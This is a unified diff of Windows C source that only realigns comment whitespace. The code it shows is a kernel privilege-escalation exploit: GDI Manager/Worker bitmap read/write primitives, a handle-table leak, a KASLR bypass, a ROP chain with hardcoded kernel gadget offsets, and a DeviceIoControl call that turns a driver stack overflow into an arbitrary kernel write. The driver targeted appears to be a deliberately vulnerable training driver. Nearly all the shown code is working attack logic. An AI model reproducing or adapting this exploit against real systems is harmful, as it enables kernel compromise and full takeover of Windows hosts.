@@ -6,7 +6,7 @@
 
 LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen)
 {
-	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);		// Set Workers pvScan0 to the Address we want to read. 
+	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);	// Set Workers pvScan0 to the Address we want to read. 
 	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
 }
 
@@ -22,8 +22,8 @@ LeakBitmapInfo GDIReloaded(LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
 {
 	LeakBitmapInfo BitmapInfo;
 	DWORD dwCounter = 0;
-	HACCEL hAccel;							// Handle to Accelerator table 
-	LPACCEL lpAccel;						// Pointer to Accelerator table Array
+	HACCEL hAccel;						// Handle to Accelerator table 
+	LPACCEL lpAccel;					// Pointer to Accelerator table Array
 	PUSER_HANDLE_ENTRY AddressA = NULL;
 	PUSER_HANDLE_ENTRY AddressB = NULL;
 	PUCHAR pAcceleratorAddrA = NULL;
@@ -240,13 +240,13 @@ int wmain(int argc, wchar_t* argv[])
 
 	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);
 
-	hDevice = CreateFile(lpDeviceName,					// Name of the write
-		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
-		FILE_SHARE_WRITE,								// Allow Share
-		NULL,											// Default security
-		OPEN_EXISTING,									// Opens a file or device, only if it exists.
+	hDevice = CreateFile(lpDeviceName,			// Name of the write
+		GENERIC_READ | GENERIC_WRITE,			// Open for reading/writing
+		FILE_SHARE_WRITE,				// Allow Share
+		NULL,						// Default security
+		OPEN_EXISTING,					// Opens a file or device, only if it exists.
 		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
-		NULL);											// No attr. template
+		NULL);						// No attr. template
 
 	if (hDevice == INVALID_HANDLE_VALUE)
 	{
@@ -261,18 +261,18 @@ int wmain(int argc, wchar_t* argv[])
 
 	KASLRBypass = KernelInfo(lpFunctionName);
 	// pop Worker and Manager PvScan0 Address in rax/r8 register:
-	BitmapPvScan0Prep.PopRaxRet = KASLRBypass.pKernelBase + 0x4483f5;			// pop rax ; ret
+	BitmapPvScan0Prep.PopRaxRet = KASLRBypass.pKernelBase + 0x4483f5;		// pop rax ; ret
 	BitmapPvScan0Prep.pWorkerBitmapPvScan0 = WorkerBitmap.pBitmapPvScan0;		// WorkerBitmap PvScan0 Address
-	BitmapPvScan0Prep.PopR8Ret = KASLRBypass.pKernelBase + 0x4253f6;			// pop r8 ; ret
+	BitmapPvScan0Prep.PopR8Ret = KASLRBypass.pKernelBase + 0x4253f6;		// pop r8 ; ret
 	BitmapPvScan0Prep.pManagerBitmapPvScan0 = ManagerBitmap.pBitmapPvScan0;		// ManagerBitmap PvScan0 Address
 	// Write Worker PvScan0 Address to Manager PvScan0 Address:
-	BitmapPvScan0Prep.MovQwR8RaxRet = KASLRBypass.pKernelBase + 0x26d0;			// mov qword [r8], rax ; ret
+	BitmapPvScan0Prep.MovQwR8RaxRet = KASLRBypass.pKernelBase + 0x26d0;		// mov qword [r8], rax ; ret
 	// Recover:
 	BitmapPvScan0Prep.XorRaxRaxRet = KASLRBypass.pKernelBase + 0x13a11a;		// xor rax, rax ; ret
-	BitmapPvScan0Prep.PopRsiRet = KASLRBypass.pKernelBase + 0x46e0;				// pop rsi ; ret
-	BitmapPvScan0Prep.pZero1 = NULL;											// 0x0
-	BitmapPvScan0Prep.PopRdiRet = KASLRBypass.pKernelBase + 0x825b4;			// pop rdi ; ret
-	BitmapPvScan0Prep.pZero2 = NULL;											// 0x0
+	BitmapPvScan0Prep.PopRsiRet = KASLRBypass.pKernelBase + 0x46e0;			// pop rsi ; ret
+	BitmapPvScan0Prep.pZero1 = NULL;						// 0x0
+	BitmapPvScan0Prep.PopRdiRet = KASLRBypass.pKernelBase + 0x825b4;		// pop rdi ; ret
+	BitmapPvScan0Prep.pZero2 = NULL;						// 0x0
 	// Return to IrpDeviceIoCtlHandler+0xe2
 
 	CHAR *chBuffer;
@@ -293,14 +293,14 @@ int wmain(int argc, wchar_t* argv[])
 
 	wprintf(L" [*] Lets send some Bytes to our Driver and ROP our StackOverflow into a Arbitrary Write");
 
-	DWORD junk = 0;                     // Discard results
+	DWORD junk = 0;                     	// Discard results
 
 	bResult = DeviceIoControl(hDevice,	// Device to be queried
-		0x222003,						// Operation to perform
-		chBuffer, 2152,					// Input Buffer
-		NULL, 0,						// Output Buffer
-		&junk,							// # Bytes returned
-		(LPOVERLAPPED)NULL);			// Synchronous I/O	
+		0x222003,			// Operation to perform
+		chBuffer, 2152,			// Input Buffer
+		NULL, 0,			// Output Buffer
+		&junk,				// # Bytes returned
+		(LPOVERLAPPED)NULL);		// Synchronous I/O	
 	if (!bResult) {
 		wprintf(L" -> Failed to send Data!\n\n");
 		CloseHandle(hDevice);
